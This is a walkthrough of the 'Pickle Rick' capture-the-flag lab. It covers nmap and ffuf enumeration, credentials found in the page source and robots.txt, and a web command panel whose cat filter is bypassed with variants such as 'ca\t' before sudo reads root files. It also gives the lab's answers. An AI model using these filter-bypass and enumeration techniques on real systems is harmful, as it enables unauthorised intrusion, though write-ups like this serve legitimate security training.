## Key Information

| Type | Value | Source |
|------|------|--------|
| Username | R1ckRul3s | HTML source |
| Password | Wubbalubbadubdub | robots.txt |
| 1st Ingredient | mr. meeseek hair | Sup3rS3cretPickl3Ingred.txt |
| 2st Ingredient | 1 jerry tear |/home/rick/second\ ingredients |
| 3st Ingredient | fleeb juice | 3rd.txt |


# Pickle Rick - Detailed Walkthrough

## Phase 1: Reconnaissance

### Initial Scan

Start with an nmap scan to identify open ports and services.

```bash
nmap -sV -sC -oN scans/initial.txt <target_ip>
```
Note: Saving the nmap scan output to a file isn’t required, but it’s a useful habit to develop.

Example:
```bash
nmap -sV -sC -oN scans/initial.txt 10.145.181.166
```

| Flag  | Purpose                                   |
| ----- | ----------------------------------------- |
| `-sC` | default scripts (basic vuln/recon checks) |
| `-sV` | detect service versions                   |
| `-oN` | save output to file                       |

### Results

- **Port 22 (SSH)**: OpenSSH 8.2p1 (Ubuntu)
- **Port 80 (HTTP)**: Apache 2.4.41 (Ubuntu)

### Analysis

- Port 80 is open → web application available → **primary attack vector**
- Port 22 is open → possible SSH access if credentials are found
- Apache server detected → likely a web-based challenge
- Page title: **"Rick is sup4r cool"** → possible hint or theme-related clue


## Phase 2: Initial Access

### Web Application Analysis

Examine the web application for potential vulnerabilities. Check:
- Source code (view page source)
- Robots.txt (file that tells search engines what NOT to index)
- Hidden directories
- Comments in HTML

In your browser:
```bash
http://10.145.181.166
```
Right Click → View Page Source
OR press:
```bash
Ctrl + U
```
Findings:
    Note to self, remember username!

    Username: R1ckRul3s

Check Robots.txt
```bash
[Ctrl + U](http://10.146.176.199/robots.txt)
```

Finding: Wubbalubbadubdub

It seems we now have a password and a username; let's look for a login page or SSH access.

### Directory Enumeration

Used ffuf to discover hidden endpoints:

```bash
ffuf -u http://10.146.176.199/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -fc 404
```
Lets try
```bash
ffuf -u http://10.146.176.199/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302,403 -fc 404
```
Let's look for an input field on the main page
```bash
curl -s http://10.146.176.199 | grep -i input
```
Let's try!
```bash
ffuf -u http://10.146.176.199/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -mc 200,301,302,403 -fc 404
```
-e .php,.html,.txt tells ffuf to try each word in multiple forms.

note: The reason to choose simple commands first is to reinforce the learning, going from simple to complex
And choosing a strategy based on evidence. 

Found: /login.php (200)

Now we use the username and password found above, see the top table.

Lets try
```bash
http://10.146.176.199/login.php
```
## Phase 3: Exploitation

### Command Execution

Exploit discovered vulnerabilities to gain command execution on the system.

ls seems to work
Let's try opening Sup3rS3cretPickl3Ingred.txt
```bash
cat Sup3rS3cretPickl3Ingred.txt
```
cat is blocked → simple filter/WAF
Try to Bypass Command Filtering
eg
```bash
c a t
ca\t
/bin/cat
```
or try using another common command

```bash
less Sup3rS3cretPickl3Ingred.txt
```
```bash
more Sup3rS3cretPickl3Ingred.txt
```
head, tail, etc.

Analysis
- The application uses simple string filtering to block commands
- Bypass achieved by altering command structure
- Demonstrates insecure command filtering


## Phase 4: Post-Exploitation

### Privilege Escalation

Find and escalate privileges to discover all ingredients.

Try ls -la to look for hidden folders

Found ., ..

Next try: ls /home
And keep exploring: /home/rick

found: /home/ricksecond ingredients

Since the filename contains a space, it must be escaped:

Try: ca\t /home/rick/second\ ingredients

Found: 1 jerry tear

note: when exploring keep an eye for High-value directories

| Path      | Why             |
|-----------|-----------------|
| /home     | user files      |
| /root     | admin files     |
| /var/www  | web app files   |
| /etc      | configs         |

Try ls / -la

Found: One of the directories shows root

### Privilege Escalation & Final Ingredient

#### Permission Issue

Initial attempts to access `/root` failed due to permission restrictions.

#### Privilege Escalation

Checked sudo privileges and confirmed elevated access:

```bash
sudo ls /root
```
```bash
sudo less /root/3rd.txt
```
Found: 3rd ingredients: fleeb juice



## Key Takeaways

- Always check source code
- Enumerate thoroughly
- Basic Linux commands are essential
